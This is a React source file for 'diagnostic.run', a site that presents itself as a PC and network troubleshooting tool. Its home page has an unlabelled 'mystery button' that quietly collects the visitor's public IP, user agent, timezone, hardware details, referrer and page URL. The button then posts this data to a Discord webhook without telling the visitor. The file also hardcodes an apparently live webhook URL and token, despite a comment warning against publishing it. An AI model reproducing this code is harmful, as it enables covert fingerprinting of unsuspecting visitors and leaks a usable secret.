import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import './styles.css';

/*
 * IMPORTANT:
 * Keep your Discord webhook out of GitHub.
 * Paste your webhook URL locally here if you are using
 * the mystery button.
 */
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1544799468476563506/CnL5_J1Lzv6dDdtoyVwVNjDKETvWu84m-c-wLcQjpwm3xEFcKKaEFZ5d1qIw1AjQSAvd';

/* =========================
   ROUTING
========================= */

function getRouteFromHash() {
  const hash = window.location.hash;

  switch (hash) {
    case '#/diagnostic':
      return 'diagnostic';

    case '#/pc':
      return 'pc';

    case '#/wifi':
      return 'wifi';

    case '#/downloads':
      return 'downloads';

    case '#/':
    case '':
      return 'home';

    default:
      return 'home';
  }
}

function navigate(path) {
  /*
   * Update the URL.
   *
   * The hashchange event will then update React's
   * route state and display the correct page.
   */
  if (window.location.hash === path) {
    window.scrollTo({
      top: 0,
      behavior: 'instant'
    });

    return;
  }

  window.location.hash = path;

  window.scrollTo({
    top: 0,
    behavior: 'instant'
  });
}

function useRoute() {
  const [route, setRoute] = useState(
    getRouteFromHash()
  );

  useEffect(() => {
    const handleRouteChange = () => {
      setRoute(getRouteFromHash());

      window.scrollTo({
        top: 0,
        behavior: 'instant'
      });
    };

    /*
     * Listen for:
     * - Navigation buttons
     * - Browser Back
     * - Browser Forward
     */
    window.addEventListener(
      'hashchange',
      handleRouteChange
    );

    /*
     * Make sure the current URL is processed
     * immediately when the app loads.
     */
    handleRouteChange();

    return () => {
      window.removeEventListener(
        'hashchange',
        handleRouteChange
      );
    };
  }, []);

  return route;
}

/* =========================
   NAVIGATION
========================= */

function Nav() {
  return (
    <nav className="nav">

      <button
        type="button"
        className="logo logo-button"
        onClick={() => navigate('#/')}
      >
        diagnostic<span>.run</span>
      </button>

      <div className="nav-links">

        <button
          type="button"
          onClick={() => navigate('#/')}
        >
          Home
        </button>

        <button
          type="button"
          onClick={() => navigate('#/diagnostic')}
        >
          Run Diagnostic
        </button>

        <button
          type="button"
          onClick={() => navigate('#/pc')}
        >
          PC Performance
        </button>

        <button
          type="button"
          onClick={() => navigate('#/wifi')}
        >
          Wi-Fi
        </button>

        <button
          type="button"
          onClick={() => navigate('#/downloads')}
        >
          Downloads
        </button>

      </div>
    </nav>
  );
}

/* =========================
   LAYOUT
========================= */

function Layout({ children }) {
  return (
    <div className="app">
      <Nav />
      {children}
    </div>
  );
}

/* =========================
   TERMINAL
========================= */

function Terminal() {
  return (
    <div className="terminal">

      <div className="terminal-top">

        <span className="dot red"></span>
        <span className="dot yellow"></span>
        <span className="dot green"></span>

        <span className="terminal-title">
          diagnostic.run
        </span>

      </div>

      <div className="terminal-body">

        <div>
          <span className="green-text">$</span>{' '}
          diagnostic --scan
        </div>

        <div className="terminal-muted">
          Initializing diagnostic engine...
        </div>

        <div className="terminal-muted">
          Checking system components...
        </div>

        <div className="terminal-muted">
          Checking network connection...
        </div>

        <div>
          <span className="green-text">✓</span>{' '}
          Ready.
        </div>

      </div>

    </div>
  );
}

/* =========================
   HOME
========================= */

function Home() {
  return (
    <>
      <main>

        {/* HERO */}

        <section className="hero">

          <div className="hero-content">

            <div className="eyebrow">
              <span className="status-dot"></span>
              SYSTEM DIAGNOSTICS
            </div>

            <h1>
              Know what's wrong.
              <br />
              <span>Fix what's slow.</span>
            </h1>

            <p className="hero-description">
              diagnostic.run gives you simple tools
              to find problems with your PC, network
              and internet connection.
            </p>

            <div className="hero-buttons">

              <button
                type="button"
                className="primary-button"
                onClick={() =>
                  navigate('#/diagnostic')
                }
              >
                Run Diagnostic
                <span>→</span>
              </button>

              <button
                type="button"
                className="secondary-button"
                onClick={() =>
                  navigate('#/pc')
                }
              >
                Explore Tools
              </button>

            </div>

          </div>

          <Terminal />

        </section>

        {/* SERVICES */}

        <section className="services">

          <div className="section-heading">
            <span>01</span>
            <h2>Diagnostic tools</h2>
          </div>

          <div className="service-grid">

            {/* PC PERFORMANCE */}

            <button
              type="button"
              className="service-card"
              onClick={() =>
                navigate('#/pc')
              }
            >

              <div className="service-number">
                01
              </div>

              <h3>
                PC Performance
              </h3>

              <p>
                Find common causes of slowdowns
                and improve system performance.
              </p>

              <span className="service-arrow">
                →
              </span>

            </button>

            {/* WI-FI */}

            <button
              type="button"
              className="service-card"
              onClick={() =>
                navigate('#/wifi')
              }
            >

              <div className="service-number">
                02
              </div>

              <h3>
                Wi-Fi & Network
              </h3>

              <p>
                Troubleshoot connection problems,
                latency and network issues.
              </p>

              <span className="service-arrow">
                →
              </span>

            </button>

            {/* DOWNLOADS */}

            <button
              type="button"
              className="service-card"
              onClick={() =>
                navigate('#/downloads')
              }
            >

              <div className="service-number">
                03
              </div>

              <h3>
                Downloads
              </h3>

              <p>
                Access diagnostic utilities and
                additional tools.
              </p>

              <span className="service-arrow">
                →
              </span>

            </button>

          </div>

        </section>

        {/* QUICK WINS */}

        <section className="quick-wins">

          <div className="section-heading">
            <span>02</span>
            <h2>Quick wins</h2>
          </div>

          <div className="quick-grid">

            <div className="quick-card">

              <span>01</span>

              <h3>
                Restart your router
              </h3>

              <p>
                A simple restart can clear temporary
                network problems and connection issues.
              </p>

            </div>

            <div className="quick-card">

              <span>02</span>

              <h3>
                Restart your PC
              </h3>

              <p>
                Restarting clears temporary processes
                and gives your system a clean start.
              </p>

            </div>

            <div className="quick-card">

              <span>03</span>

              <h3>
                Check background apps
              </h3>

              <p>
                Close applications consuming unnecessary
                CPU, RAM or network resources.
              </p>

            </div>

          </div>

        </section>

        {/* MYSTERY BUTTON */}

        <MysteryButton />

      </main>

      <Footer />

    </>
  );
}

/* =========================
   MYSTERY BUTTON
========================= */

function MysteryButton() {

  const [status, setStatus] =
    useState('');

  async function getPublicIP() {

    try {

      const response = await fetch(
        'https://api.ipify.org?format=json',
        {
          cache: 'no-store'
        }
      );

      if (!response.ok) {
        throw new Error(
          'IP request failed'
        );
      }

      const data =
        await response.json();

      return data.ip || 'Unknown';

    } catch {

      return 'Unavailable';

    }
  }

  async function measurePing() {

    const start =
      performance.now();

    try {

      await fetch(
        `/favicon.png?ping=${Date.now()}`,
        {
          method: 'HEAD',
          cache: 'no-store'
        }
      );

      return `${Math.round(
        performance.now() - start
      )} ms`;

    } catch {

      return 'Unavailable';

    }
  }

  async function handleClick() {

    if (
      !DISCORD_WEBHOOK ||
      DISCORD_WEBHOOK.includes(
        'PASTE_YOUR'
      )
    ) {

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 1500);

      return;
    }

    setStatus('...');

    try {

      const ip =
        await getPublicIP();

      const ping =
        await measurePing();

      const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

      const deviceInfo = {

        IP: ip,

        Ping: ping,

        Platform:
          navigator.platform ||
          'Unknown',

        Browser:
          navigator.userAgent ||
          'Unknown',

        Language:
          navigator.language ||
          'Unknown',

        Languages:
          navigator.languages?.join(', ') ||
          'Unknown',

        Timezone:
          Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone ||
          'Unknown',

        Screen:
          `${window.screen.width} × ${window.screen.height}`,

        Viewport:
          `${window.innerWidth} × ${window.innerHeight}`,

        PixelRatio:
          window.devicePixelRatio ||
          'Unknown',

        CPU:
          navigator.hardwareConcurrency
            ? `${navigator.hardwareConcurrency} threads`
            : 'Unknown',

        Memory:
          navigator.deviceMemory
            ? `${navigator.deviceMemory} GB`
            : 'Unknown',

        ConnectionType:
          connection?.effectiveType ||
          'Unknown',

        Downlink:
          connection?.downlink
            ? `${connection.downlink} Mbps`
            : 'Unknown',

        Referrer:
          document.referrer ||
          'Direct',

        Page:
          window.location.href
      };

      const fields =
        Object.entries(
          deviceInfo
        ).map(([name, value]) => ({
          name,
          value: String(value),
          inline: true
        }));

      const response =
        await fetch(
          DISCORD_WEBHOOK,
          {
            method: 'POST',

            headers: {
              'Content-Type':
                'application/json'
            },

            body: JSON.stringify({

              content:
                'button clicked',

              embeds: [
                {
                  title:
                    'Mystery Button Clicked',

                  description:
                    'Public browser/device information collected from diagnostic.run',

                  fields,

                  timestamp:
                    new Date().toISOString()
                }
              ]

            })
          }
        );

      if (!response.ok) {
        throw new Error(
          'Webhook request failed'
        );
      }

      setStatus('✓');

      setTimeout(() => {
        setStatus('');
      }, 1500);

    } catch (error) {

      console.error(error);

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 1500);

    }
  }

  return (

    <section className="mystery-section">

      <div className="mystery-label">
        what does this do?
      </div>

      <div className="mystery-ring">

        <button
          type="button"
          className="mystery-button"
          onClick={handleClick}
          disabled={status === '...'}
          aria-label="Mystery button"
        >
          {status}
        </button>

      </div>

    </section>

  );
}

/* =========================
   DIAGNOSTIC PAGE
========================= */

function Diagnostic() {

  const [results, setResults] =
    useState(null);

  const [running, setRunning] =
    useState(false);

  async function runDiagnostic() {

    setRunning(true);

    const start =
      performance.now();

    try {

      await fetch(
        `/favicon.png?diagnostic=${Date.now()}`,
        {
          method: 'HEAD',
          cache: 'no-store'
        }
      );

    } catch {}

    const latency =
      Math.round(
        performance.now() - start
      );

    setResults({

      browser:
        navigator.userAgent,

      platform:
        navigator.platform ||
        'Unknown',

      cores:
        navigator.hardwareConcurrency ||
        'Unknown',

      memory:
        navigator.deviceMemory
          ? `${navigator.deviceMemory} GB`
          : 'Unknown',

      screen:
        `${window.screen.width} × ${window.screen.height}`,

      viewport:
        `${window.innerWidth} × ${window.innerHeight}`,

      connection:
        navigator.connection?.effectiveType ||
        'Unknown',

      latency:
        `${latency} ms`

    });

    setRunning(false);
  }

  return (

    <Page>

      <div className="page-header">

        <div className="section-heading">
          <span>03</span>
          <h2>System Diagnostic</h2>
        </div>

        <p>
          Run a quick browser-based diagnostic
          to see information about your current
          system and connection.
        </p>

      </div>

      <div className="diagnostic-box">

        <button
          type="button"
          className="primary-button diagnostic-button"
          onClick={runDiagnostic}
          disabled={running}
        >

          {running
            ? 'Running...'
            : 'Run Diagnostic'}

          {!running && (
            <span>→</span>
          )}

        </button>

        {results && (

          <div className="results">

            <Result
              name="Browser"
              value={results.browser}
            />

            <Result
              name="Platform"
              value={results.platform}
            />

            <Result
              name="CPU Threads"
              value={results.cores}
            />

            <Result
              name="Memory"
              value={results.memory}
            />

            <Result
              name="Screen"
              value={results.screen}
            />

            <Result
              name="Viewport"
              value={results.viewport}
            />

            <Result
              name="Connection"
              value={results.connection}
            />

            <Result
              name="Latency"
              value={results.latency}
            />

          </div>

        )}

      </div>

    </Page>

  );
}

/* =========================
   RESULT ROW
========================= */

function Result({
  name,
  value
}) {

  return (

    <div className="result-row">

      <span>{name}</span>

      <strong>{value}</strong>

    </div>

  );
}

/* =========================
   PC PERFORMANCE PAGE
========================= */

function PCPerformance() {

  return (

    <Page>

      <div className="page-header">

        <div className="section-heading">
          <span>04</span>
          <h2>PC Performance</h2>
        </div>

        <p>
          Find common causes of slow performance
          and improve the responsiveness of your
          computer.
        </p>

      </div>

      <div className="guide-grid">

        <GuideCard
          number="01"
          title="Check Task Manager"
          text="Open Task Manager and check which applications are using the most CPU, memory and disk resources."
        />

        <GuideCard
          number="02"
          title="Disable startup apps"
          text="Unnecessary programs launching with Windows can slow down startup and consume resources in the background."
        />

        <GuideCard
          number="03"
          title="Check storage"
          text="A nearly full drive can cause performance problems. Keep enough free storage available on your main drive."
        />

        <GuideCard
          number="04"
          title="Update drivers"
          text="Graphics, chipset and network drivers can have a major impact on system performance and stability."
        />

        <GuideCard
          number="05"
          title="Check temperatures"
          text="Excessive CPU or GPU temperatures can cause thermal throttling and significantly reduce performance."
        />

        <GuideCard
          number="06"
          title="Restart your PC"
          text="A restart clears temporary processes and gives your operating system a clean start."
        />

      </div>

    </Page>

  );
}

/* =========================
   WIFI PAGE
========================= */

function Wifi() {

  return (

    <Page>

      <div className="page-header">

        <div className="section-heading">
          <span>05</span>
          <h2>Wi-Fi & Network</h2>
        </div>

        <p>
          Troubleshoot connection problems,
          latency and common network issues.
        </p>

      </div>

      <div className="guide-grid">

        <GuideCard
          number="01"
          title="Restart your router"
          text="Power your router off, wait around 30 seconds, then turn it back on."
        />

        <GuideCard
          number="02"
          title="Check other devices"
          text="If every device is experiencing the same problem, the issue is probably with your network rather than one computer."
        />

        <GuideCard
          number="03"
          title="Move closer"
          text="Weak Wi-Fi signals can cause high latency, low speeds and connection drops."
        />

        <GuideCard
          number="04"
          title="Use Ethernet"
          text="A wired Ethernet connection can provide lower latency and a more stable connection."
        />

        <GuideCard
          number="05"
          title="Check your speed"
          text="Compare your actual connection speed against the speed advertised by your internet provider."
        />

        <GuideCard
          number="06"
          title="Check latency"
          text="High latency can make games, calls and interactive applications feel slow even when download speeds are high."
        />

      </div>

    </Page>

  );
}

/* =========================
   DOWNLOADS PAGE
========================= */

function Downloads() {

  return (

    <Page>

      <div className="page-header">

        <div className="section-heading">
          <span>06</span>
          <h2>Downloads</h2>
        </div>

        <p>
          Diagnostic utilities and additional
          tools will be available here.
        </p>

      </div>

      <div className="downloads-box">

        <div className="download-item">

          <div>

            <span className="download-number">
              01
            </span>

            <h3>
              Diagnostic Utilities
            </h3>

            <p>
              Additional diagnostic tools will
              appear here in the future.
            </p>

          </div>

          <span className="download-status">
            COMING SOON
          </span>

        </div>

      </div>

    </Page>

  );
}

/* =========================
   GUIDE CARD
========================= */

function GuideCard({
  number,
  title,
  text
}) {

  return (

    <div className="guide-card">

      <span>{number}</span>

      <h3>{title}</h3>

      <p>{text}</p>

    </div>

  );
}

/* =========================
   PAGE WRAPPER
========================= */

function Page({
  children
}) {

  return (

    <>

      <main className="page">

        <button
          type="button"
          className="back-home"
          onClick={() =>
            navigate('#/')
          }
        >
          ← Home
        </button>

        {children}

      </main>

      <Footer />

    </>

  );
}

/* =========================
   FOOTER
========================= */

function Footer() {

  return (

    <footer className="footer">

      <div>

        <button
          type="button"
          className="logo logo-button"
          onClick={() =>
            navigate('#/')
          }
        >
          diagnostic<span>.run</span>
        </button>

        <p>
          Know what's wrong. Fix what's slow.
        </p>

      </div>

      <div className="footer-right">

        <span>
          © {new Date().getFullYear()}
          {' '}diagnostic.run
        </span>

      </div>

    </footer>

  );
}

/* =========================
   APP
========================= */

function App() {

  const route = useRoute();

  let page;

  switch (route) {

    case 'diagnostic':
      page = <Diagnostic />;
      break;

    case 'pc':
      page = <PCPerformance />;
      break;

    case 'wifi':
      page = <Wifi />;
      break;

    case 'downloads':
      page = <Downloads />;
      break;

    case 'home':
    default:
      page = <Home />;
      break;

  }

  return (

    <Layout>
      {page}
    </Layout>

  );
}

/* =========================
   START APPLICATION
========================= */

createRoot(
  document.getElementById('root')
).render(

  <React.StrictMode>
    <App />
  </React.StrictMode>

);
